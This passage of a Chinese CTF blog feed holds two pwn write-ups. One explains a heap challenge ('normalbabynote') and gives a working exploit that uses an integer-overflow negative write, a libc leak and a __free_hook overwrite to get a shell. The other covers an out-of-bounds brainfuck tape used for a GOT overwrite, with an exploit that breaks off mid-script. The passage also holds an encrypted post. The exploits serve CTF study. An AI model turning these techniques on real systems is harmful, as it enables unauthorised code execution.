be72f1eff88b558238fccf2098fcc350cfadea8d41bb29a8eefe3fa7d3bdada3e386cd12cf36b5f1ca1df0e702cbf25761e908195427c9391f1631832697506789145ef573bb2b3a665d680ae2ee87b807b7cf4fab95ac1ce8ecf2a5e50687348e1497ac2eaa6c61b2a1451758ee6848fd335bab4066b12d55618d0fd8663cd341e52a4f0f20b7280eb14847bc088d112b35272ff1d8c11c9206928e87fbb49850312886acc2d7eeb45ef4828e2b2aea32d5ec130579c0c2f314b4e3176efa9e18a6d344f660b775c4544727f3c1fe1a347fa24f8a7c8cb14c783e88935532b75518143520061523cd81c16b1101d0adeb5da7e521f24ec6aa7f9c626082759586a359dfdceae4a31965c639f220615059137cefa46a767303d0325f7e33137d9af526cf84a32dc3166345fe77db436b2f0e6e75b93ceec6f1f74a6ef5ce035b400b25da86409c645a54d5d1c8b67bfe292c6dba5b8bb8fba4f8ba665ab1729bf5b47685fc0293a0b9455876e17682fe2dbd1167e3ff36f9ef53bc08e72c20f434c2a884cafba6c8297e18834489f7a8c1c5d2a44ac197ccfba734b0f4ade473b958c8b41da39688d9b7319e6b539d13319473db995d2bb782bc5783c2c688ff6a853387ee060d0edb5e24ad76be3854629fd0c991f28a40126278fdc6b0f4fc680173c3647a22b1e249a8c3a96e571f3d97af0e614cf85461482e5a3e88709f9ec7fe3f37bcf8dd5246f0fac7acd5adc39c60310e289b07b186662c3a25d937bfe3f28caf98347097aa62e18a7b486393bdcf062f9920850fd122416dfe9efaf162f5930c8244be3417100ce5e5afa1c2be21af936327daf8245dc255eb50cfdd172492538b619d8e9a52137649220a02fdfa45cd30254455206ba5ff46ab58d03cc142327817cb6266e9bb9d60ba8fd6c183f72596628cbae0924012a8060b4df1570e196e8cb3620b341007bf0a9993335f2ce63e264858ba948d331a00b3dd3b651fe5e7d46f0c747ffad6b27b646a7d4d2cb4ac25ef3052ea93dbffff182f96a1792f6194ff7b3968d7075aa6377da224239973f34890337fbb261e34257f90dc4209b444497e80e2cf77fd8c170f7e00f4e7d634381869e6a19e9226d1cc924c44da126d47ec593d41f7693354b1a9f50dfa909c75ec1829224f19262cda7edd4a4e4cb600b378dd66724a80eb22010adf01842de5bb3b070ae3e6ade02b0394d9ee435f29effd176742fa78bda12dcd8f0fba3d178daddb6422d2b19763f7df7e3916dc0e22286a301d10c847c596c4b6b295913e9b485c439b9a87e7bfbad099137d14fd67a646febac40ce5615a7e664fa1d57109dcd735391773281905964bf4902d6a6ca07312a8abd7c21d0c49d91f995f9963c4dd38f15963cd9cb0c032eb744959b9dcb9013f1389d9785e070479d6184ce0db9afb29d4f433a17a81916c7484fa44e1811e0660e443bd92ce6190849f8a52fa98262f88bbad1b5ba15bbbe7d59dc9165e6a2fdf1e1875ef146ab8fa8cf855b20b9a591a9aa084c7146c715b9e43c449ee8a798ffb41ab253731ca58a3acdcd7fcc21f827feac90e4e417e50eb9d196a3c1ae4aea14a009857052d7c93e838c330766f8c2b56ec8475b87d80ef537293702b8288f9080d7703acbb86c73c4b99f4eb21cac7ea08989a5bd9436f2b580e352207998fa8ed30a8a2b30ab070bb7524ac5dca4bb3c59d38e06590889a83c90be1badb15c95f15e7a4362e9c34ea6d8921eeceba44b8fcd9749f34bb90077d00330f7125da7f4a17274739f7efd7a54220f93f6efc042a5f7f0632fa7b351ac45db34eb34c9c89fca9d9b4a950d104dd6a0919cf79ced9729537d48604f4a9f6e79eb5c76650108947b83f8b4e7a43ff91cf16eb3d9b70580ee9a9a6e0d3993b09ab494c3d980fb1183d4da9bf7dfef83f5cecc1171b32b39fbb098548d7432def55cb9a874cc0d27b8ae279ace83c6d9b05d949bc2b312d9d6481da0f1b56a172966e6d88639c4bd353f2b35e1311a41ce08814648674d8e99ce260a2b92eb9e51773db4852bc104e1c25d09bf4cafb969fd99fe2c503f9fb00acd78e3a2d00d41a4ac557ad27915c84eebad92dff5aed5ab93ea7bf489b1226be8bcee8cc73413dfd64bd44a359ecded73d0da4fc2a238269d5627ca285691e73f6344f102af35f9e2670a19f6baf962d04eb3be5b0f4b86f2957692d1649dc7774c8c644ec2e486c6f86497eb83f5073cc3c015f39a2ee4004a06bcaf46826bade5faccb5236eae05ac69048c9b2cdeef67e4a985040a0bfc4a72b2e74df9771fe11eb941fc33287b62cdd87bdead1a8e565cf4a10ab229d35794f64f8ba991b0cb66a8689459e026f05af7171f70fa9a3c5a086a8fa274d3c86acfb169b7257051947d1e580c96728372c2b0e828c460e0f43d0f0b0f34f23d809e517eddf20a38bf862b8060a83e47a0e8d2072cbf0aa40dc135d3a0969008ea2829191228f92f32a1982127c14660c08abcf07d36cbdf6a2175a9109e4268b7a97edaf98323094910f11fa82bb0665cd557fe2b62ade53d87866511a9c569021662b072c59845a9e0425cd68ae2e32f7e1756b179af2287c50860243a122b37b4bfa3fa2a2330667f08a1a77f02b6a73dc7d7ad11b558d94a6fdb5d33b0f3e6b6c360cd44c473b61cddfe72aad0def4daa83a594ffb94b6df8f879f9b4ca8f0f8ddd63fe648686cf27b28f2392f5cdae8a27d92cdc906d016706b40e11e315583abf6f1a0cc85cc68f0bd63bde1c7e92bf505566d50a5f886a82316009533263b31629a54c03e6739b1463bcd78db621a9a25cf430e949b2707588c245d690eeefd1756d40b0c4d21c5a412b8ff5191731aa7694886fedac6f7c291e2937c3a7cf6d77c8407f093ee0eb4abf77da7617d30765d791d6904af18e6f1686af48fefb2fd3141f4f58b135eb888df1d83794969c7d6a3fd72e9bf4312d0dc33baa00f5243d93ddaaa8a2bc6d1e3fe5d2dc3d6b0c063c79b08f95c2f945592f37a13d37e11e86a177878f942826a12042ba2a6a0a92453a1f85e25aa32f08a4f8db235500beaf822096ddd4ab65f89f8162449a3ad41c9e909bdb108b056b1e32244ec881274b8d1229ca9b2ede5c39fe97a947acdb7f16689229968fc24962ca89eb9ef24838ba1f2bd14f216db2750f715ba49b1abf91e390362927a980fca124aa26b7d99542a57572a9048078c29b5d6bdb5f2e8dca3b91d64b5599268dc43e7a4b6f1ca621f7442f73e90318a3d686c66988bcb306046b220a7493cccd3627557d08d44c91018af34eada4c100f44b7bc6e05252196754a656443c6ca08e6712de45b9d2a4a058656ba619b06e81019a82b46d7eb4bd393514a57c1ec0ae92a85b9523eb7a7ecc966a03d5fe2f08ba44f00b52854d7240c6377cd5398ac4a778ad081f1c76f05e0cbb58cbdc6c6345ab504d85942418b1fcf34cf7e160abc46d32f41cd7ef2b226ce1fc0fadf8daa49e51d1e91daf2361299c1134a21fde687461f7a7e5e47d2644972723fcffd28bf281e2f547874ebe8a06bda647aa984cb097b7231f7810512</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024-12第三周2：normalbabynote</title>
      <link href="/2024/12/21/2024-12%E7%AC%AC%E4%B8%89%E5%91%A82%EF%BC%9Anormalbabynote/"/>
      <url>/2024/12/21/2024-12%E7%AC%AC%E4%B8%89%E5%91%A82%EF%BC%9Anormalbabynote/</url>
      
        <content type="html"><![CDATA[<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p><img src="/EXP_FILE/d5c87a68584104cabfaaf21deaa0da54_MD5.jpeg"></p><p>给了libc</p><h1 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h1><p>经典堆菜单<br><img src="/EXP_FILE/5e07d5e722b024c622f9b44e9068d1ed_MD5.jpeg"></p><p>重点关注add和edit</p><ul><li><p>add<br><img src="/EXP_FILE/7679fe6f39f3ad75f624ef66b509446e_MD5.jpeg"><br>申请的chunk&lt;0x2f0，并且末尾置0，测试没有off by null</p></li><li><p>edit<br><img src="/EXP_FILE/cfc7a4630c83ace46c815090c3a96c3a_MD5.jpeg"></p></li></ul><p>这里用abs取绝对值，但是没有对我们的输入作出限制，那么就可以整数溢出，当输入一个 0x80000000（-2147483648） 时，由于正数最大为 2147483647 ，所以会转换失败而返回负值</p><p>也就是说我们有一个负向溢出写</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>可以负向溢出写，tcache 打 __free_hook</p><p>但是该如何泄露libc？</p><ul><li>思路1、填满tcache进到unsortedbin。但是题目只能申请16次，填满tcache都得占掉14次，不可行</li><li>思路2、利用负向溢出写，能改掉自己的size构造unsortedbin chunk，通过堆重叠泄露libc<br><img src="/EXP_FILE/9c2b258746c85e7ff0a9edb2695eb9d4_MD5.jpeg"></li></ul><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span><span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>sla<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'size> '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'msg> '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>offset<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'idx> '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'offset> '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'msg> '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'idx> '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'idx> '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>add<span class="token punctuation">(</span><span class="token number">0x1f0</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#0</span>add<span class="token punctuation">(</span><span class="token number">0x1f0</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#1</span>add<span class="token punctuation">(</span><span class="token number">0x1f0</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#2</span>add<span class="token punctuation">(</span><span class="token number">0x1f0</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#3</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">2147483648</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token number">0x38</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x601</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#0</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x1f0</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#4</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>leak<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>leak<span class="token operator">-</span><span class="token number">0x3ebca0</span>lg<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>free_hook<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'__free_hook'</span><span class="token punctuation">)</span>system<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x1f0</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#5</span>add<span class="token punctuation">(</span><span class="token number">0x1f0</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#6</span>delete<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x1f0</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#7</span>add<span class="token punctuation">(</span><span class="token number">0x1f0</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#8</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 150"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./pwn'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTFpwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 每周一pwn系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024-12第三周：pwnable_bf</title>
      <link href="/2024/12/19/2024-12%E7%AC%AC%E4%B8%89%E5%91%A8%EF%BC%9Apwnable_bf/"/>
      <url>/2024/12/19/2024-12%E7%AC%AC%E4%B8%89%E5%91%A8%EF%BC%9Apwnable_bf/</url>
      
        <content type="html"><![CDATA[<blockquote><p>题目地址：<a href="https://buuoj.cn/challenges#pwnable_bf">BUUCTF在线评测</a><br>vmpwn专题-2</p></blockquote><h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p><img src="/EXP_FILE/cd644ea16a968acdba5a681a792795f3_MD5.jpeg"></p><h1 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h1><p>一个brainfuck虚拟机<br><img src="/EXP_FILE/b67c8a860502406ff58f392b38fe6b16_MD5.jpeg"><br>p是一个全局指针，指向 bss段的 tape </p><p>对opcode的解析相对比较简单<br><img src="/EXP_FILE/d6a656b9d268ab3149335e6f8ab74fdc_MD5.jpeg"></p><ul><li>“+”：++*p，tape存储的值+1</li><li>“,”：输入一个字节到*p</li><li>“-“：–*p，tape存储的值-1</li><li>“.”：打印*p一个字节 </li><li>“&lt;”：–p，p所指地址-1</li><li>“&gt;”：++p，p所指地址+1</li><li>“[“：没用</li></ul><p>因为没对p做出任何限制，所以可以任意地址读写</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>现在能做的：</p><ol><li>增&#x2F;减任意地址一字节</li><li>输入&#x2F;输出任意地址任意字节<br>partial relro，bss 又离 GOT 很近，可以直接改 GOT 表</li></ol><p>我一开始想如何泄露完libc后再回到main上，改GOT为main？</p><p>其实不需要，opcode先泄露再输入，这样泄露完libc后程序会等待输入，我们就可以改GOT了</p><p>发现改成one_gadget没用，那么只能走system(‘&#x2F;bin&#x2F;sh’)，但是putchar只能传参一字节，不好直接构造，还是得回到main上<br><img src="/EXP_FILE/7652a8e59b639c045f0b226f95deb0c0_MD5.jpeg"></p><p>思路：</p><ol><li>先打印puts地址泄露libc</li><li>改putchar为main，改memset为gets，改fgets为system，然后回到main时输入 ‘&#x2F;bin&#x2F;sh’<br><img src="/EXP_FILE/b3dc8f8d90135764a3f77fb5964215ca_MD5.jpeg"><br>我一开始想改puts为main，但是主函数还会调用puts，这就相当于调用了很多次main导致程序异常。改putchar就很好，毕竟已经泄露过了libc</li></ol><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span><span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#,</span><span class="token comment">#dbg('b *0x0804865A')</span><span class="token comment">#+</span><span class="token comment">#dbg('b *0x08048665')</span><span class="token comment">#leak puts</span>payload<span class="token operator">=</span><span class="token string">'&lt;'</span><span class="token operator">*</span><span class="token number">0x88</span>payload<span class="token operator">+=</span><span class="token string">'.>.>.>.'</span>payload<span class="token operator">+=</span><span class="token string">'&lt;&lt;&lt;'</span><span class="token comment">#putchar</span>payload<span class="token operator">+=</span><span class="token string">'>'</span><span class="token operator">*</span><span class="token number">0x18</span>payload<span class="token operator">+=</span><span class="token string">',>,>,>,>'</span><span class="token comment">#memset</span>payload<span class="token operator">+=</span><span class="token string">'&lt;'</span><span class="token operator">*</span><span class="token number">0x8</span>payload<span class="token operator">+=</span><span class="token string">',>,>,>,>'</span><span class="token comment">#fgets</span>payload<span class="token operator">+=</span><span class="token string">'&lt;'</span><span class="token operator">*</span><span class="token number">0x20</span>payload<span class="token operator">+=</span><span class="token string">',>,>,>,>'</span>payload<span class="token operator">+=</span><span class="token string">'.'</span>sla<span class="token punctuation">(</span><span class="token string">'except [ ]'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>puts<span class="token operator">=</span>u32<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts<span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>puts<span class="token operator">-</span>ls<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token 